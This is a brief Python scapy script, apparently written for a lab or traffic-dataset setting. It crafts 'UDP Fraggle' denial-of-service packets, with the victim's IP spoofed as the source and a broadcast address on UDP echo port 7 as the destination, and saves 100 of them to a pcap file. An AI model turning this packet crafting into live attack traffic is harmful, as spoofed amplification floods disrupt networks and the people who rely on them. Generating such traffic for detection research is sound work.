from scapy.all import *
import random
import time
import ipaddress

# UDP Fraggle
BROADCAST_IP = "192.168.100.255"
VICTIM_IP = "192.168.100.2"
BOTFILE = "../bots.txt"
NUM_PACKETS = 100

def load_bots(filename):
    bot_ips = []
    with open(filename, "r") as f:
        for line in f:
            ip = line.strip()
            if ip:
                ipaddress.ip_address(ip)
                bot_ips.append(ip)
    return bot_ips

def run_udp_fraggle():
    bot_ips = load_bots(BOTFILE)
    lista_de_pacotes = []
    numero_de_pacotes_enviados = 0

    while True:
        eth_layer = Ether()
        ip_layer = IP(src=VICTIM_IP, dst=BROADCAST_IP)
        udp_layer = UDP(sport=50001, dport=7)  # Echo UDP
        payload = Raw(load=b"X")
        packet = eth_layer / ip_layer / udp_layer / payload
        lista_de_pacotes.append(packet)
        numero_de_pacotes_enviados += 1

        if numero_de_pacotes_enviados == NUM_PACKETS:
            break

    start_time = time.perf_counter()
    wrpcap("udp_fraggle.pcap", lista_de_pacotes)
    end_time = time.perf_counter()
    duration = end_time - start_time

    print(f"\nPCAP file saved.")
    print(f"Total time to save packets: {duration:.4f} seconds")

if __name__ == "__main__":
    run_udp_fraggle()

# Comando: sudo PYTHONPATH=$HOME/scapy python3 udp_fraggle.py